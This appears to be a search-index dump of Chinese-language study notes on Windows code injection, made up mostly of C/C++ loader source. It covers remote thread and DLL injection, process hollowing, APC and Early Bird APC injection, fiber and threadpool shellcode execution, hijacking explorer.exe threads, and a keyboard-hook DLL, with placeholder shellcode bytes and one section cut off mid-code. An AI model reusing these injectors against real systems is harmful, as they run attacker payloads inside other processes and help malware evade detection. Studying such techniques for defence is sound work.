\u5f80\u8fdb\u7a0b\u7684\u865a\u62df\u5185\u5b58\u5199\u5165shellcode CreateRemoteThread \u5728\u8fdc\u7a0b\u8fdb\u7a0b\u4e0a\u521b\u5efa\u7ebf\u7a0b #include \"Windows.h\" int main(int argc, char *argv[]) { unsigned char shellcode[] = \"\\x48\"; HANDLE processHandle; HANDLE remoteThread; PVOID remoteBuffer; printf(\"Injecting to PID: %i\", atoi(argv[1])); processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1]))); remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE); WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL); remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL); CloseHandle(processHandle); return 0; }","title":"\u8fdc\u7a0b\u8fdb\u7a0b\u6ce8\u5165"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#dll","text":"\u5c06dll\u6ce8\u5165\u5230\u8fdc\u7a0b\u8fdb\u7a0b\uff0c\u6d41\u7a0b\u548c\u8fdc\u7a0b\u8fdb\u7a0b\u6ce8\u5165\u5dee\u4e0d\u591a int main(int argc, char *argv[]) { HANDLE processHandle; PVOID remoteBuffer; wchar_t dllPath[] = TEXT(\"C:\\\\experiments\\\\evilm64.dll\"); printf(\"Injecting DLL to PID: %i\\n\", atoi(argv[1])); processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1]))); remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof dllPath, MEM_COMMIT, PAGE_READWRITE); WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)dllPath, sizeof dllPath, NULL); PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT(\"Kernel32\")), \"LoadLibraryW\"); CreateRemoteThread(processHandle, NULL, 0, threatStartRoutineAddress, remoteBuffer, 0, NULL); CloseHandle(processHandle); return 0; }","title":"DLL\u6ce8\u5165"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#process-doppelganging","text":"https://github.com/hasherezade/process_doppelganging","title":"process doppelganging \uff08\u8fdb\u7a0b\u5206\u8eab\uff09"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#shellcode","text":"#pragma comment(linker, \"/subsystem:\\\"windows\\\" /entry:\\\"mainCRTStartup\\\"\") #include <iostream> #include <Windows.h> #include \"resource.h\" int main() { // IDR_METERPRETER_BIN1 - is the resource ID - which contains ths shellcode // METERPRETER_BIN is the resource type name we chose earlier when embedding the meterpreter.bin HRSRC shellcodeResource = FindResource(NULL, MAKEINTRESOURCE(IDR_PAYLOAD_BIN1), L\"payload_bin\"); DWORD shellcodeSize = SizeofResource(NULL, shellcodeResource); HGLOBAL shellcodeResouceData = LoadResource(NULL, shellcodeResource); void* exec = VirtualAlloc(0, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE); memcpy(exec, shellcodeResouceData, shellcodeSize); ((void(*)())exec)(); return 0; } \u5bfc\u5165\u81ea\u5b9a\u4e49\u8d44\u6e90 \u7c7b\u578b\u540d\u79f0\u8981\u5bf9\u5e94 \u53ef\u770b\u5230shellcode\u88ab\u5b58\u50a8\u5230\u4e86\u8d44\u6e90\u8868\u4e2d ![[../images/20230706154501.png]]","title":"\u4ece\u8d44\u6e90\u8868\u8f7d\u5165shellcode"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#process-hollowing","text":"\u4ee3\u7801\u6ca1\u6d4b\u8bd5\u6210\u529f\uff0c\u5148\u653e\u7740 \u672c\u4f8b\u4ee3\u7801\u4e2d CreateProcessA\u51fd\u6570 \u521b\u5efa\u8fdb\u7a0b BOOL CreateProcessA( [in, optional] LPCSTR lpApplicationName, \u6267\u884c\u7684\u7a0b\u5e8f\u540d\u79f0 [in, out, optional] LPSTR lpCommandLine, \u6267\u884c\u7684\u547d\u4ee4 [in, optional] LPSECURITY_ATTRIBUTES lpProcessAttributes, \u4e00\u822cNULL [in, optional] LPSECURITY_ATTRIBUTES lpThreadAttributes, \u4e00\u822cNULL [in] BOOL bInheritHandles, [in] DWORD dwCreationFlags, \u8fdb\u7a0b\u6807\u5fd7 [in, optional] LPVOID lpEnvironment, [in, optional] LPCSTR lpCurrentDirectory, [in] LPSTARTUPINFOA lpStartupInfo, STARTUPINFOA\u7ed3\u6784\u4f53\uff0c\u6307\u5b9a\u521b\u5efa\u65f6\u8fdb\u7a0b\u7684\u4e3b\u7a97\u53e3\u7684\u7a97\u53e3\u5de5\u4f5c\u7ad9\u3001\u684c\u9762\u3001\u6807\u51c6\u53e5\u67c4\u548c\u5916\u89c2\u3002 [out] LPPROCESS_INFORMATION lpProcessInformation PROCESS_INFORMATION\u7ed3\u6784\u4f53,\u53e5\u67c4\u53ca\u7ebf\u7a0b\u4fe1\u606f ); NtQueryInformationProcess\u51fd\u6570 \u68c0\u7d22\u6709\u5173\u6307\u5b9a\u8fdb\u7a0b\u7684\u4fe1\u606f\u3002 // process-hollowing.cpp : This file contains the 'main' function. Program execution begins and ends there. // #include <iostream> #include <Windows.h> #include <winternl.h> using NtUnmapViewOfSection = NTSTATUS(WINAPI*)(HANDLE, PVOID); typedef struct BASE_RELOCATION_BLOCK { DWORD PageAddress; DWORD BlockSize; } BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK; typedef struct BASE_RELOCATION_ENTRY { USHORT Offset : 12; USHORT Type : 4; } BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY; int main() { // create destination process - this is the process to be hollowed out LPSTARTUPINFOA si = new STARTUPINFOA(); LPPROCESS_INFORMATION pi = new PROCESS_INFORMATION(); PROCESS_BASIC_INFORMATION* pbi = new PROCESS_BASIC_INFORMATION(); DWORD returnLenght = 0; CreateProcessA(NULL, (LPSTR)\"c:\\\\windows\\\\syswow64\\\\notepad.exe\", NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, si, pi); HANDLE destProcess = pi->hProcess; // get destination imageBase offset address from the PEB NtQueryInformationProcess(destProcess, ProcessBasicInformation, pbi, sizeof(PROCESS_BASIC_INFORMATION), &returnLenght); DWORD pebImageBaseOffset = (DWORD)pbi->PebBaseAddress + 8; // get destination imageBaseAddress LPVOID destImageBase = 0; SIZE_T bytesRead = NULL; ReadProcessMemory(destProcess, (LPCVOID)pebImageBaseOffset, &destImageBase, 4, &bytesRead); // read source file - this is the file that will be executed inside the hollowed process HANDLE sourceFile = CreateFileA(\"c:\\\\windows\\\\syswow64\\\\notepad.exe\", GENERIC_READ, NULL, NULL, OPEN_ALWAYS, NULL, NULL); DWORD sourceFileSize = GetFileSize(sourceFile, NULL); LPDWORD fileBytesRead = 0; LPVOID sourceFileBytesBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sourceFileSize); ReadFile(sourceFile, sourceFileBytesBuffer, sourceFileSize, NULL, NULL); // get source image size PIMAGE_DOS_HEADER sourceImageDosHeaders = (PIMAGE_DOS_HEADER)sourceFileBytesBuffer; PIMAGE_NT_HEADERS sourceImageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD)sourceFileBytesBuffer + sourceImageDosHeaders->e_lfanew); SIZE_T sourceImageSize = sourceImageNTHeaders->OptionalHeader.SizeOfImage; // carve out the destination image NtUnmapViewOfSection myNtUnmapViewOfSection = (NtUnmapViewOfSection)(GetProcAddress(GetModuleHandleA(\"ntdll\"), \"NtUnmapViewOfSection\")); myNtUnmapViewOfSection(destProcess, destImageBase); // allocate new memory in destination image for the source image LPVOID newDestImageBase = VirtualAllocEx(destProcess, destImageBase, sourceImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); destImageBase = newDestImageBase; // get delta between sourceImageBaseAddress and destinationImageBaseAddress DWORD deltaImageBase = (DWORD)destImageBase - sourceImageNTHeaders->OptionalHeader.ImageBase; // set sourceImageBase to destImageBase and copy the source Image headers to the destination image sourceImageNTHeaders->OptionalHeader.ImageBase = (DWORD)destImageBase; WriteProcessMemory(destProcess, newDestImageBase, sourceFileBytesBuffer, sourceImageNTHeaders->OptionalHeader.SizeOfHeaders, NULL); // get pointer to first source image section PIMAGE_SECTION_HEADER sourceImageSection = (PIMAGE_SECTION_HEADER)((DWORD)sourceFileBytesBuffer + sourceImageDosHeaders->e_lfanew + sizeof(IMAGE_NT_HEADERS32)); PIMAGE_SECTION_HEADER sourceImageSectionOld = sourceImageSection; int err = GetLastError(); // copy source image sections to destination for (int i = 0; i < sourceImageNTHeaders->FileHeader.NumberOfSections; i++) { PVOID destinationSectionLocation = (PVOID)((DWORD)destImageBase + sourceImageSection->VirtualAddress); PVOID sourceSectionLocation = (PVOID)((DWORD)sourceFileBytesBuffer + sourceImageSection->PointerToRawData); WriteProcessMemory(destProcess, destinationSectionLocation, sourceSectionLocation, sourceImageSection->SizeOfRawData, NULL); sourceImageSection++; } // get address of the relocation table IMAGE_DATA_DIRECTORY relocationTable = sourceImageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]; // patch the binary with relocations sourceImageSection = sourceImageSectionOld; for (int i = 0; i < sourceImageNTHeaders->FileHeader.NumberOfSections; i++) { BYTE* relocSectionName = (BYTE*)\".reloc\"; if (memcmp(sourceImageSection->Name, relocSectionName, 5) != 0) { sourceImageSection++; continue; } DWORD sourceRelocationTableRaw = sourceImageSection->PointerToRawData; DWORD relocationOffset = 0; while (relocationOffset < relocationTable.Size) { PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)((DWORD)sourceFileBytesBuffer + sourceRelocationTableRaw + relocationOffset); relocationOffset += sizeof(BASE_RELOCATION_BLOCK); DWORD relocationEntryCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY); PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)((DWORD)sourceFileBytesBuffer + sourceRelocationTableRaw + relocationOffset); for (DWORD y = 0; y < relocationEntryCount; y++) { relocationOffset += sizeof(BASE_RELOCATION_ENTRY); if (relocationEntries[y].Type == 0) { continue; } DWORD patchAddress = relocationBlock->PageAddress + relocationEntries[y].Offset; DWORD patchedBuffer = 0; ReadProcessMemory(destProcess, (LPCVOID)((DWORD)destImageBase + patchAddress), &patchedBuffer, sizeof(DWORD), &bytesRead); patchedBuffer += deltaImageBase; WriteProcessMemory(destProcess, (PVOID)((DWORD)destImageBase + patchAddress), &patchedBuffer, sizeof(DWORD), fileBytesRead); int a = GetLastError(); } } } // get context of the dest process thread LPCONTEXT context = new CONTEXT(); context->ContextFlags = CONTEXT_INTEGER; GetThreadContext(pi->hThread, context); // update dest image entry point to the new entry point of the source image and resume dest image thread DWORD patchedEntryPoint = (DWORD)destImageBase + sourceImageNTHeaders->OptionalHeader.AddressOfEntryPoint; context->Eax = patchedEntryPoint; SetThreadContext(pi->hThread, context); ResumeThread(pi->hThread); return 0; }","title":"Process Hollowing \uff08\u8fdb\u7a0b\u6316\u7a7a\uff09"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#apc","text":"\u961f\u5217\u4f1a\u5b9a\u671f\u679a\u4e3e\uff0c\u5b9a\u671f\u8c03\u7528shellcode #pragma comment(linker, \"/subsystem:\\\"windows\\\" /entry:\\\"mainCRTStartup\\\"\") #include <iostream> #include <Windows.h> #include <TlHelp32.h> #include <vector> int main() { unsigned char buf[] = \"\\xff\"; HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0); HANDLE victimProcess = NULL; PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) }; THREADENTRY32 threadEntry = { sizeof(THREADENTRY32) }; std::vector<DWORD> threadIds; SIZE_T shellSize = sizeof(buf); HANDLE threadHandle = NULL; if (Process32First(snapshot, &processEntry)) { while (_wcsicmp(processEntry.szExeFile, L\"explorer.exe\") != 0) { Process32Next(snapshot, &processEntry); } } victimProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, processEntry.th32ProcessID); LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE); PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress; WriteProcessMemory(victimProcess, shellAddress, buf, shellSize, NULL); if (Thread32First(snapshot, &threadEntry)) { do { if (threadEntry.th32OwnerProcessID == processEntry.th32ProcessID) { threadIds.push_back(threadEntry.th32ThreadID); } } while (Thread32Next(snapshot, &threadEntry)); } for (DWORD threadId : threadIds) { threadHandle = OpenThread(THREAD_ALL_ACCESS, TRUE, threadId); QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL); Sleep(1000 * 2); } return 0; }","title":"APC\u961f\u5217\u6ce8\u5165"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#early-bird-apc","text":"\u7531\u4e8e\u662f\u65b0\u8d77\u4e86\u4e00\u4e2a\u8fdb\u7a0b\uff0c\u5c06\u6076\u610fAPC\u5bf9\u8c61\u52a0\u5230\u8fdb\u7a0b\u7684\u7ebf\u7a0b\u4e2d\uff0c\u6240\u4ee5\u4f1a\u4ee5\u542f\u52a8\u8fdb\u7a0b\u7684\u8eab\u4efd\u542f\u52a8\u6076\u610f\u4ee3\u7801 \u672c\u4f8b\u4e2d\u7528\u5230\u7684\u51fd\u6570 QueueUserAPC \u5c06APC\u5bf9\u8c61\u6dfb\u52a0\u5230\u6307\u5b9a\u7ebf\u7a0b\u7684APC\u961f\u5217 ResumeThread \u5524\u9192\u7ebf\u7a0b #include <Windows.h> int main() { unsigned char buf[] = \"\\xff\"; SIZE_T shellSize = sizeof(buf); STARTUPINFOA si = { 0 }; PROCESS_INFORMATION pi = { 0 }; CreateProcessA(\"C:\\\\Windows\\\\System32\\\\notepad.exe\", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi); //\u8d77\u4e00\u4e2a\u6302\u8d77\u72b6\u6001\u7684notepad\u8fdb\u7a0b HANDLE victimProcess = pi.hProcess; //\u83b7\u53d6notepad\u8fdb\u7a0b\u7684\u8fdb\u7a0b\u53e5\u67c4 HANDLE threadHandle = pi.hThread; //\u83b7\u53d6notepad\u8fdb\u7a0b\u7684\u7ebf\u7a0b\u53e5\u67c4 LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE); //\u5728notepad\u8fdb\u7a0b\u4e2d\u5206\u914d\u4e00\u4e2a\u865a\u62df\u5185\u5b58 PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress; // \u4e3a\u6307\u5b9a\u7684\u865a\u62df\u5185\u5b58\u5757\u5206\u914d\u4e00\u4e2aAPC\u5bf9\u8c61\u7c7b\u578b WriteProcessMemory(victimProcess, shellAddress, buf, shellSize, NULL); // \u5f80\u865a\u62df\u5185\u5b58\u5199\u5165shellcode QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL); // \u5c06\u5305\u542bshellcode\u7684APC\u5bf9\u8c61\u5206\u914d\u7ed9notepad\u7684\u7ebf\u7a0b ResumeThread(threadHandle); //\u5524\u9192\u7ebf\u7a0b\uff0c\u5c06\u542f\u52a8APC\u961f\u5217\u6267\u884cshellcode return 0; }","title":"Early Bird APC\u6ce8\u5165"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#queueuserapcnttestalert","text":"#pragma comment(linker, \"/subsystem:\\\"windows\\\" /entry:\\\"mainCRTStartup\\\"\") #include <Windows.h> #pragma comment(lib, \"ntdll\") using myNtTestAlert = NTSTATUS(NTAPI*)(); int main() { unsigned char buf[] = \"\\xfc\"; myNtTestAlert testAlert = (myNtTestAlert)(GetProcAddress(GetModuleHandleA(\"ntdll\"), \"NtTestAlert\")); SIZE_T shellSize = sizeof(buf); LPVOID shellAddress = VirtualAlloc(NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE); WriteProcessMemory(GetCurrentProcess(), shellAddress, buf, shellSize, NULL); PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress; QueueUserAPC((PAPCFUNC)apcRoutine, GetCurrentThread(), NULL); testAlert(); return 0; }","title":"\u901a\u8fc7 QueueUserAPC\u548cNtTestAlert\u6ce8\u5165"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#fibers-shellcode","text":"\u7528\u4e00\u4e2a\u7ea4\u7a0b\u542f\u52a8\u53e6\u4e00\u4e2a\u6076\u610f\u7ea4\u7a0b \u7ea4\u7a0b\u662f\u6bd4\u7ebf\u7a0b\u66f4\u5c0f\u4e00\u7ea7\u7684\u5355\u4f4d \u672c\u4f8b\u4e2d\u7528\u5230\u7684\u51fd\u6570 ConvertThreadToFiber \u5f53\u524d\u4e3b\u7ebf\u7a0b\u8f6c\u6362\u4e3a\u7ea4\u7a0b CreateFiber \u521b\u5efa\u7ea4\u7a0b\uff0c\u521b\u5efa\u7684\u7ea4\u7a0b\u4e0d\u4f1a\u542f\u52a8 SwitchToFiber \u8c03\u7528\u7ea4\u7a0b\u4ee5\u4fbf\u542f\u52a8 #include <Windows.h> int main() { //convert main thread to fiber PVOID mainFiber = ConvertThreadToFiber(NULL); unsigned char shellcode[] = \"\\xfc\"; PVOID shellcodeLocation = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE); //\u5206\u914d\u865a\u62df\u5185\u5b58 memcpy(shellcodeLocation, shellcode, sizeof shellcode); //shellcode\u590d\u5236\u5230\u865a\u62df\u5185\u5b58 // create a fiber that will execute the shellcode PVOID shellcodeFiber = CreateFiber(NULL, (LPFIBER_START_ROUTINE)shellcodeLocation, NULL); // manually schedule the fiber that will execute our shellcode SwitchToFiber(shellcodeFiber); return 0; }","title":"\u4eceFibers \uff08\u7ea4\u7a0b\uff09\u8f7d\u5165shellcode"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#shellcode_1","text":"\u8bbe\u7f6e\u4e00\u4e2a\u5bf9\u8c61\uff0c\u8bbe\u7f6e\u4e00\u4e2a\u7b49\u5f85\u5bf9\u8c61\u7684\u56de\u8c03\u51fd\u6570(\u542bshellcode)\uff0c\u5c06\u5bf9\u8c61\u8bbe\u7f6e\u4e00\u76f4\u7b49\u5f85\uff0c\u6267\u884c\u56de\u8c03\u51fd\u6570(shellcode) \u672c\u4f8b\u4e2d\u7528\u5230\u7684\u51fd\u6570 CreateEvent \u521b\u5efa\u4e00\u4e2a\u4e8b\u4ef6\u5bf9\u8c61\uff0c\u8fd4\u56de\u4e8b\u4ef6\u53e5\u67c4 RtlMoveMemory \u590d\u5236\u5185\u5b58\u5757\uff0c\u76ee\u6807\uff0c\u6e90 CreateThreadpoolWait \u521b\u5efa\u7b49\u5f85\u5bf9\u8c61 SetThreadpoolWait \u8bbe\u7f6e\u7b49\u5f85\u5bf9\u8c61 WaitForSingleObject \u68c0\u67e5\u5f53\u524d\u72b6\u6001 #include <windows.h> #include <threadpoolapiset.h> unsigned char shellcode[] = \"\\xfc\"; int main() { HANDLE event = CreateEvent(NULL, FALSE, TRUE, NULL); LPVOID shellcodeAddress = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE); RtlMoveMemory(shellcodeAddress, shellcode, sizeof(shellcode)); PTP_WAIT threadPoolWait = CreateThreadpoolWait((PTP_WAIT_CALLBACK)shellcodeAddress, NULL, NULL); SetThreadpoolWait(threadPoolWait, event, NULL); WaitForSingleObject(event, INFINITE); return 0; }","title":"\u901a\u8fc7\u7b49\u5f85\u5bf9\u8c61\u56de\u8c03\u51fd\u6570\u8f7d\u5165shellcode"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#textshellcode","text":"#pragma section(\".text\") __declspec(allocate(\".text\")) char goodcode[] = \"\\xfc; int main() { (*(void(*)())(&goodcode))(); }","title":"\u4ecetext\u8868\u8f7d\u5165shellcode"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#_4","text":"\u6307\u5b9a\u8fdc\u7a0b\u8fdb\u7a0b\uff0c\u679a\u4e3e\u8fdb\u7a0b\u7684\u7ebf\u7a0b\u5e76\u52ab\u6301\u3002 \u88ab\u52ab\u6301\u7684\u8fdb\u7a0b\u4f1a\u5361\u6b7b\u3002 \u53ef\u679a\u4e3e\u5f53\u524d\u8fdb\u7a0b\u6307\u5b9a\u4e00\u4e2a\u8fdb\u7a0b\u540d\uff0c\u6216\u65b0\u8d77\u4e00\u4e2a\u8fdb\u7a0b\u3002 \u679a\u4e3e\u6307\u5b9a\u8fdb\u7a0b\u540d\u4ee5\u4fbf\u6ce8\u5165 #include <iostream> #include <Windows.h> #include <TlHelp32.h> #include <stdio.h> DWORD GetProcessIdByName(const wchar_t* processName) { DWORD pid = 0; HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (snapshot != INVALID_HANDLE_VALUE) { PROCESSENTRY32W processEntry; processEntry.dwSize = sizeof(PROCESSENTRY32W); if (Process32FirstW(snapshot, &processEntry)) { do { if (_wcsicmp(processEntry.szExeFile, processName) == 0) { pid = processEntry.th32ProcessID; break; } } while (Process32NextW(snapshot, &processEntry)); } CloseHandle(snapshot); } return pid; } //\u679a\u4e3e\u8fdb\u7a0b\u540d\u83b7\u53d6PID int main() { unsigned char shellcode[] = \"\\xfc\"; HANDLE targetProcessHandle; PVOID remoteBuffer; HANDLE threadHijacked = NULL; HANDLE snapshot; THREADENTRY32 threadEntry; CONTEXT context; const wchar_t* processName = L\"explorer.exe\"; DWORD targetPID = GetProcessIdByName(processName); //\u5f97\u5230PID //DWORD targetPID = 5440; context.ContextFlags = CONTEXT_FULL; threadEntry.dwSize = sizeof(THREADENTRY32); targetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID); remoteBuffer = VirtualAllocEx(targetProcessHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE); WriteProcessMemory(targetProcessHandle, remoteBuffer, shellcode, sizeof shellcode, NULL); snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0); Thread32First(snapshot, &threadEntry); while (Thread32Next(snapshot, &threadEntry)) { if (threadEntry.th32OwnerProcessID == targetPID) { threadHijacked = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID); break; } } SuspendThread(threadHijacked); GetThreadContext(threadHijacked, &context); context.Rip = (DWORD_PTR)remoteBuffer; SetThreadContext(threadHijacked, &context); ResumeThread(threadHijacked); } \u521b\u5efa\u4e00\u4e2a\u540e\u53f0\u8fdb\u7a0b\u6ce8\u5165 #pragma comment(linker, \"/subsystem:\\\"windows\\\" /entry:\\\"mainCRTStartup\\\"\") #include <iostream> #include <Windows.h> #include <TlHelp32.h> #include <stdio.h> int main() { unsigned char shellcode[] = \"\\xfc\"; HANDLE targetProcessHandle; PVOID remoteBuffer; HANDLE threadHijacked = NULL; HANDLE snapshot; THREADENTRY32 threadEntry; CONTEXT context; //const wchar_t* processName = L\"notepad.exe\"; //DWORD targetPID = GetProcessIdByName(processName); char commandLine[] = \"C:\\\\Windows\\\\System32\\\\notepad.exe\"; STARTUPINFOA si = { 0 }; PROCESS_INFORMATION pi = { 0 }; CreateProcessA(NULL, commandLine, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi); DWORD targetPID = pi.dwProcessId; HWND hWnd = FindWindow(NULL, NULL); while (hWnd != NULL) { DWORD processID; GetWindowThreadProcessId(hWnd, &processID); if (processID == targetPID) { break; } hWnd = FindWindowEx(NULL, hWnd, NULL, NULL); } ShowWindow(hWnd, SW_HIDE); Sleep(10); //DWORD targetPID = 988; context.ContextFlags = CONTEXT_FULL; threadEntry.dwSize = sizeof(THREADENTRY32); targetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID); remoteBuffer = VirtualAllocEx(targetProcessHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE); WriteProcessMemory(targetProcessHandle, remoteBuffer, shellcode, sizeof shellcode, NULL); snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0); Thread32First(snapshot, &threadEntry); while (Thread32Next(snapshot, &threadEntry)) { if (threadEntry.th32OwnerProcessID == targetPID) { threadHijacked = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID); break; } } SuspendThread(threadHijacked); GetThreadContext(threadHijacked, &context); context.Rip = (DWORD_PTR)remoteBuffer; SetThreadContext(threadHijacked, &context); ResumeThread(threadHijacked); }","title":"\u8fdc\u7a0b\u7ebf\u7a0b\u52ab\u6301"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#setwindowhookex","text":"#include \"pch.h\" #include <iostream> #include <Windows.h> int main() { HMODULE library = LoadLibraryA(\"dllhook.dll\"); HOOKPROC hookProc = (HOOKPROC)GetProcAddress(library, \"spotlessExport\"); HHOOK hook = SetWindowsHookEx(WH_KEYBOARD, hookProc, library, 0); Sleep(10*1000); UnhookWindowsHookEx(hook); return 0; } #include \"stdafx.h\" BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; } extern \"C\" __declspec(dllexport) int spotlessExport() { unsigned char shellcode[] = \"\\xfc\"; void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE); memcpy(exec, shellcode, sizeof shellcode); ((void(*)())exec)(); return 0; }","title":"SetWindowHookEx\u6ce8\u5165"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#ntcreatesection-ntmapviewofsection","text":"\u5b9e\u73b0\u6d41\u7a0b\uff1a \u4f7f\u7528NtCreateSection\u521b\u5efa\u4e00\u4e2a\u5728\u8fdb\u7a0b\u4e2d\u5171\u4eab\u7684\u5185\u5b58\u5757 \u4f7f\u7528ZwMapViewOfSection\u5c06\u5728\u5185\u5b58\u4e2d\u7684\u67d0\u8282\u6620\u5c04\u5230\u6307\u5b9a\u8fdb\u7a0b\u4e2d \u5728\u8fdc\u7a0b\u8fdb\u7a0b\u4e2d\u521b\u5efa\u4e00\u4e2a\u7ebf\u7a0b\uff0c\u5c06\u8fd9\u6bb5\u5185\u5b58\u89c6\u56fe\u6620\u5c04\u5230\u7ebf\u7a0b\u4e2d\uff0c\u5185\u5b58\u89c6\u56fe\u4fdd\u5b58\u4e86shellcode\uff0c\u4ee5\u4fbf\u8fdc\u7a0b\u8fdb\u7a0b\u6267\u884cshellcode #include <iostream> #include <Windows.h> #include <TlHelp32.h> #include <stdio.h> #pragma comment(lib, \"ntdll\") typedef struct _LSA_UNICODE_STRING { USHORT Length; USHORT MaximumLength; PWSTR Buffer; } UNICODE_STRING, * PUNICODE_STRING; typedef struct _OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor; PVOID SecurityQualityOfService; } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES; typedef struct _CLIENT_ID { PVOID UniqueProcess; PVOID UniqueThread; } CLIENT_ID, * PCLIENT_ID; using myNtCreateSection = NTSTATUS(NTAPI*)(OUT PHANDLE SectionHandle, IN ULONG DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, IN PLARGE_INTEGER MaximumSize OPTIONAL, IN ULONG PageAttributess, IN ULONG SectionAttributes, IN HANDLE FileHandle OPTIONAL); using myNtMapViewOfSection = NTSTATUS(NTAPI*)(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, DWORD InheritDisposition, ULONG AllocationType, ULONG Win32Protect); using myRtlCreateUserThread = NTSTATUS(NTAPI*)(IN HANDLE ProcessHandle, IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL, IN 